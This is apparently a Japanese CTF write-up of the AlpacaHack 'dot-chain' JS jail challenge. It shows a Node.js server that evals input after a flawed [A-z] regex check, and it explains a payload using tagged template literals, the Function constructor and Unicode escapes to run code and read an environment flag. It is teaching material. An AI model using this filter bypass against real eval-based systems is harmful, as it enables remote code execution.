---
title: "Dot Chain"
description: "Daily AlpacaHack: 2026/03/29"
pubDate: 2026-03-29
category: "daily-alpacahack"
tags: ["ctf", "security", "web"]
difficulty: "Easy"
draft: false
---

# Dot Chain

2026/03/29の課題である `dot-chain` に関するWriteUp

## 概要

JavaScriptの `eval()` を用いたサンドボックス環境から、制限された文字種のみを使って任意コード実行（RCE）を達成し、フラグを読み取る問題。
いわゆる「JS Jail」と呼ばれるジャンルのCTFチャレンジです。
[該当リンク](https://alpacahack.com/daily/challenges/dot-chain)

## コード解説

サーバー側のコードは以下の通りです。

```js
const readline = require("node:readline/promises");
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

rl.question("> ")
  .then((input) => {
    if (!/^[.0-9A-z]+$/.test(input)) return;
    eval(input);
  })
  .finally(() => rl.close());
```

標準入力から受け取った文字列を `eval()` で実行しますが、直前に正規表現によるチェックがあります。

一見すると「ドット(`.`)、数字(`0-9`)、アルファベット(`A-Z`, `a-z`)」しか入力できないように見えます。
関数呼び出しに必要なカッコ `()` やスペースが使えないため、何もできないように思えますが…。

## 攻略手順

<details class="spoiler">
<summary>🔍 攻略手順を表示する（ネタバレ注意）</summary>

### 1. 正規表現の罠を見抜く

最大の抜け穴は、入力チェックの正規表現 `/^[.0-9A-z]+$/` にあります。

アルファベットを許可する際、正しくは `A-Za-z` と書くべきですが、ここでは `A-z` と記述されています。
ASCIIコード表において、大文字の `Z`（コード90）と小文字の `a`（コード97）の間には以下の記号が存在します：

```
[ (91)  \ (92)  ] (93)  ^ (94)  _ (95)  ` (96)
```

つまり、この正規表現ではバッククォート `` ` `` やバックスラッシュ `\` も入力可能です。

### 2. カッコなしで関数を呼び出す

フラグを出力するには `console.log()` などを実行したいですが、`(` と `)` は許可されていません。
ここで、JavaScriptの「タグ付きテンプレートリテラル」と、許可されたバッククォートを利用します。

```js
// 通常の関数呼び出し
func(arg)

// タグ付きテンプレートリテラル（カッコ不要）
func`arg`
```

### 3. 任意コードの生成と実行

任意のコードを評価させるために `Function` コンストラクタを使います。

```js
Function`console.log(process.env.FLAG)`
```

これで `function() { console.log(process.env.FLAG) }` という関数が生成されます。
しかし、引数の中に `()` や空白が含まれており、正規表現で弾かれてしまいます。

### 4. Unicodeエスケープで記号を復元する

許可されているバックスラッシュ `\` を利用して、弾かれる文字をUnicodeエスケープシーケンスに変換します。

```
(  →  \u0028
)  →  \u0029
```

これを組み合わせることで、フィルターを完全にバイパスできます。

</details>

<details class="spoiler">
<summary>💻 エクスプロイトを表示する（ネタバレ注意）</summary>

### 5. エクスプロイト

最終的なペイロードは以下の通りです。

```js
Function`console.log\u0028process.env.FLAG\u0029```
```

動作の流れ：

1. 左側の `` Function`...` `` が評価され、Unicodeエスケープが解釈された上で `console.log(process.env.FLAG)` を実行する無名関数が生成される
2. 右側の空のバッククォート ` `` ` が、生成された関数を即座に呼び出す
3. サーバーの環境変数に格納された FLAG が標準出力に出力される

これを `nc` コマンドなどで問題サーバーに接続し、プロンプトに入力することで FLAG を取得できます。

</details>

## 必要となる前提知識

#### 正規表現の文字クラス（`A-z` の罠）

正規表現の `[A-z]` は「ASCIIコード65（`A`）から122（`z`）まで」を意味します。
その間にある記号（`[`, `\`, `]`, `^`, `_`, `` ` ``）もマッチしてしまうため、アルファベットのみに制限したい場合は `[A-Za-z]` と書くのが正解です。

#### タグ付きテンプレートリテラル

JavaScriptでは、関数名の直後にテンプレートリテラル（バッククォートで囲んだ文字列）を置くと、カッコなしで関数を呼び出せます。

```js
// この2つは似た動作をする
alert("hello")
alert`hello`
```

JS Jail問題では、カッコ `()` が制限されている場合の定番テクニックです。

#### Function コンストラクタ

`Function('code')` とすることで、引数の文字列を本体とする新しい関数を動的に生成できます。
`eval` と似ていますが、タグ付きテンプレートリテラルと組み合わせやすいのが特徴です。

```js
const fn = Function("return 1 + 2");
fn(); // 3
```

#### Unicodeエスケープシーケンス

JavaScriptでは `\uXXXX`（4桁の16進数）で任意のUnicode文字を表現できます。
入力フィルターやWAFを回避する際によく利用されるテクニックです。

```js
"\u0041"          // "A"
"\u0028"          // "("
console.log\u0028\u0029  // console.log() と同等
```


## まとめ

開発者のちょっとした正規表現の記述ミス（`A-Za-z` ではなく `A-z` と書いてしまったこと）が、致命的なコード実行（RCE）につながるというシナリオでした。

JS Jail問題としては非常に綺麗な構成で、JavaScriptの柔軟な文法（タグ付きテンプレートリテラル、Unicodeエスケープ）の知識が問われる良問です。正規表現を書く際は、文字クラスの範囲指定に注意しましょう。


#### BACKUP

```js
const readline = require("node:readline/promises");
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

rl.question("> ")
  .then((input) => {
    if (!/^[.0-9A-z]+$/.test(input)) return;
    eval(input);
  })
  .finally(() => rl.close());
```
